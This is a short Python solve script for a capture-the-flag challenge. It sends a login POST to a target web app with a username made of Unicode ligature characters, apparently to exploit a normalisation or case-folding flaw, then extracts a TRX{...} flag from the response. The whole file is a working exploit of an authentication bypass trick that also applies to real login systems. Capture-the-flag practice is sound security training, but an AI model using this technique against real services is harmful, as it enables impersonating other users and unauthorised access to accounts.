import sys
import re
import requests

url = sys.argv[1].strip() if len(sys.argv) > 1 else "0.0.0.0:3000"
if not url.startswith(("http://", "https://")):
    url = "http://" + url

username = "ﬆiﬄingﬂuﬃneß"
s = requests.Session()
r = s.post(f"{url}/login", data={"username": username})
flag = re.search(r"TRX\{\S+\}", r.text).group(0)
print(flag)